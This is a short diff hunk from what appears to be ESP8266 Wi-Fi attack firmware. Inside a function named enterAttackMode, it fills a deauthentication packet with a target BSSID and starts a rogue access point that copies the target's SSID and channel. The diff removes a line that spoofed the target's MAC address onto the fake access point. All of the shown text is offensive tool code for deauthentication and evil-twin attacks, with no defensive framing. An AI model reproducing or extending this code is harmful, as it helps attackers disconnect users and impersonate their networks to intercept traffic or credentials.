@@ -701,9 +701,6 @@ static void enterAttackMode(void)
     memcpy(&deauthPkt[16], targetBSSID, 6);
 
     WiFi.mode(WIFI_AP);
-    /* MAC Spoofing: Clone the target's BSSID onto our fake AP interface (SOFTAP_IF) */
-    wifi_set_macaddr(SOFTAP_IF, targetBSSID);
-    
     WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
     WiFi.softAP(targetSSID, NULL, targetChannel);
 
